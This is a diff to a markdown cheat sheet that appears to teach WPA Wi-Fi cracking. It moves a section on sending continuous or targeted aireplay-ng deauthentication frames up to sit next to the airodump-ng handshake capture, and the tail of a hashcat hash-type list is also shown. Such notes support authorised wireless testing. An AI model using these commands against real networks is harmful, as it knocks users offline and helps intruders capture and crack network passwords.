@@ -28,6 +28,21 @@ sudo airodump-ng -c 4 --bssid 00:00:00:00:00:00 -w New  wlp1s0mon
 ```
 ### ***wait for "WPA handshake" to show up in the top right corner***
 
+
+# Deauthenticating Device from the network
+```
+aireplay-ng -0 0 -a <AP-MAC> -c <Victim-Mac> wlan0mon
+```
+Command instructions:
+```
+-0 means deauthentication.
+ 0 is the number of deauths to send 0 means send them continuously, you can send 10 if you want the target to disconnect and reconnect.
+-a 50:C7:BF:DC:4C:E8 is the MAC address of the access point we are targeting.
+-c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated.
+wlan0mon is the interface name.
+```
+
+
 # Stop monitor mode on interface:
 ```
 sudo airmon-ng stop wlp1s0mon
@@ -251,19 +266,4 @@ Specific hash type:
        3711 = Mediawiki B type
        3721 = WebEdition CMS
        7600 = Redmine Project Management Web App
-```
-
-
-
-# Deauthenticating Device from the network
-```
-aireplay-ng -0 0 -a <AP-MAC> -c <Victim-Mac> wlan0mon
-```
-Command instructions:
-```
--0 means deauthentication.
- 0 is the number of deauths to send 0 means send them continuously, you can send 10 if you want the target to disconnect and reconnect.
--a 50:C7:BF:DC:4C:E8 is the MAC address of the access point we are targeting.
--c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated.
-wlan0mon is the interface name.
 ```
